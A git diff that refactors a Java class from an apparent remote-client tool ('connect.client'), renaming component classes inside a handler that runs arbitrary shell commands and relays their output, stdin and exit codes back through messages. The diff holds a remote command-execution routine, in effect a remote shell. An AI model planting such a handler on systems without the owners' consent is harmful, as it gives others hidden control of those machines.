@@ -4,8 +4,8 @@ package br.com.introcdc.connect.client.commands.process;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.FileComponents;
-import br.com.introcdc.connect.client.components.ProcessComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
+import br.com.introcdc.connect.client.components.ClientProcessComponents;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -25,12 +25,12 @@ public class ClientCommandProcess extends ClientCommand {
             return;
         }
         new Thread(() -> {
-            ProcessComponents.PROCESS++;
-            Integer id = ProcessComponents.PROCESS;
+            ClientProcessComponents.PROCESS++;
+            Integer id = ClientProcessComponents.PROCESS;
             try {
                 boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
                 String inputInfo = (windows ? "cmd /c " : "") + input;
-                File directory = new File(FileComponents.FOLDER);
+                File directory = new File(ClientFileComponents.FOLDER);
 
                 ProcessBuilder processBuilder = new ProcessBuilder();
                 processBuilder.command(inputInfo.split(" "));
@@ -42,34 +42,34 @@ public class ClientCommandProcess extends ClientCommand {
                 BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
 
                 String line;
-                msg("Executando comando: " + inputInfo + " em " + FileComponents.FOLDER + " (#" + id + ")");
-                ProcessComponents.PROCESS_MAP.put(id, process);
-                ProcessComponents.WRITER_MAP.put(id, new PrintWriter(process.getOutputStream()));
-                ProcessComponents.LOG_PROCESS.add(id);
-                ProcessComponents.PROCESS_LIST.put(id, inputInfo + " - " + FileComponents.FOLDER);
+                msg("Executando comando: " + inputInfo + " em " + ClientFileComponents.FOLDER + " (#" + id + ")");
+                ClientProcessComponents.PROCESS_MAP.put(id, process);
+                ClientProcessComponents.WRITER_MAP.put(id, new PrintWriter(process.getOutputStream()));
+                ClientProcessComponents.LOG_PROCESS.add(id);
+                ClientProcessComponents.PROCESS_LIST.put(id, inputInfo + " - " + ClientFileComponents.FOLDER);
                 while ((line = bufferedReader.readLine()) != null) {
-                    if (ProcessComponents.LOG_PROCESS.contains(id)) {
+                    if (ClientProcessComponents.LOG_PROCESS.contains(id)) {
                         msg(line);
                     }
                 }
 
-                if (ProcessComponents.LOG_PROCESS.contains(id)) {
+                if (ClientProcessComponents.LOG_PROCESS.contains(id)) {
                     msg("Erros (se houver):");
                 }
                 while ((line = errorReader.readLine()) != null) {
-                    if (ProcessComponents.LOG_PROCESS.contains(id)) {
+                    if (ClientProcessComponents.LOG_PROCESS.contains(id)) {
                         msg(line);
                     }
                 }
 
                 int exitCode = process.waitFor();
-                if (ProcessComponents.LOG_PROCESS.contains(id)) {
+                if (ClientProcessComponents.LOG_PROCESS.contains(id)) {
                     msg("\nComando finalizado com código de saída: " + exitCode);
                 }
-                ProcessComponents.LOG_PROCESS.remove(id);
-                ProcessComponents.PROCESS_MAP.remove(id);
-                ProcessComponents.PROCESS_LIST.remove(id);
-                ProcessComponents.WRITER_MAP.remove(id);
+                ClientProcessComponents.LOG_PROCESS.remove(id);
+                ClientProcessComponents.PROCESS_MAP.remove(id);
+                ClientProcessComponents.PROCESS_LIST.remove(id);
+                ClientProcessComponents.WRITER_MAP.remove(id);
             } catch (Exception exception) {
                 msg("Ocorreu um erro na execução do processo #" + id + " (" + exception.getMessage() + ")");
                 exception(exception);
